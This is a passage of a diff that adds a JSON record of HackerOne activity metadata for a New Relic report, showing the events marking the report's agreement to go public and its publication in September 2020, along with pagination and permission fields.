+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/784/e3a368de321ded9a9b2118272e89bffd355380e5_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 9128022,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-09-04T11:00:07.850Z",
+      "updated_at": "2020-09-04T11:00:07.850Z",
+      "actor": {
+        "username": "nr-dm",
+        "cleared": false,
+        "verified": false,
+        "url": "/nr-dm",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 9128023,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-09-04T11:00:07.956Z",
+      "updated_at": "2020-09-04T11:00:07.956Z",
+      "actor": {
+        "username": "nr-dm",
+        "cleared": false,
+        "verified": false,
+        "url": "/nr-dm",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
